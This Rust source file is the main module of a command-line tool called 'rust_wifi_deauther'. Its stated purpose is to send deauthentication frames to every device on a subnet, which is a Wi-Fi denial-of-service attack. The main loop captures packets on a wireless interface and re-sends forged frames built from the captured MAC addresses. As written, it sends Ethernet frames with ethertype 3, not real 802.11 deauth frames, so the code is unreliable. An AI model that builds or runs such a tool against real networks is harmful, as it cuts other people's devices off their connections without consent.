mod frame;
mod packet;
mod parse;

use clap::{App, Arg};
use custom_debug_derive::*;
use frame::Frame;
use pnet::datalink::{self, channel, Channel::Ethernet, MacAddr};
use pnet::packet::ethernet::{EtherType, MutableEthernetPacket};

#[derive(CustomDebug)]
struct CLI {
    verbose: bool,
    interface: String,
}

impl CLI {
    fn new() -> Self {
        let matches = App::new("rust_wifi_deauther")
            .version("1.0")
            .author("Mark Pedersen <markrepedersen@gmail.com>")
            .about("Send deauth frames to all devices on subnet.")
            .arg(Arg::with_name("interface")
		 .short("i")
		 .long("interface")
		 .value_name("name")
		 .help("The name of the wireless network interface. On MacOS, the wifi interface is 'en0'.")
		 .takes_value(true)
		 .default_value("en0")
		 .required(true))
	    .arg(Arg::with_name("verbose")
		 .short("v")
		 .long("verbose")
		 .help("Enable verbose mode."))
	    .get_matches();
        let interface = matches
            .value_of("interface")
            .expect("Network interface parameter is required.");
        let verbose = matches.is_present("verbose");
        CLI {
            interface: String::from(interface),
            verbose: verbose,
        }
    }
}

fn main() {
    let args = CLI::new();
    let interfaces = datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .filter(|iface| iface.name == args.interface)
        .next()
        .unwrap();

    let (mut tx, mut rx) = match channel(&interface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!("Datalink channel error: {}", e),
    };

    loop {
        match rx.next() {
            Ok(packet) => {
                let frame: Frame = process_packet(packet);
                if args.verbose {
                    println!("{:#?}", frame);
                }
                tx.build_and_send(1, packet.len(), &mut |new_packet| {
                    let mut new_packet = MutableEthernetPacket::new(new_packet).unwrap();
                    let source = frame.src.0;
                    let dest = frame.dst.0;

                    new_packet.set_ethertype(EtherType::new(3));
                    new_packet.set_source(MacAddr::new(
                	source[0],
                	source[1],
                	source[2],
                	source[3],
                	source[4],
                	source[5]));
                    new_packet.set_destination(MacAddr::new(
                	dest[0],
                	dest[1],
                	dest[2],
                	dest[3],
                	dest[4],
                	dest[5]));
                });
            }
            Err(e) => {
                panic!("An error occurred while reading packet: {}", e);
            }
        }
    }
}

fn process_packet(packet: &[u8]) -> frame::Frame {
    match frame::Frame::parse(packet) {
        Ok((_remaining, frame)) => {
            return frame;
        }
        Err(nom::Err::Error(e)) => {
            println!("{:?}", e);
            panic!();
        }
        _ => unreachable!(),
    }
}
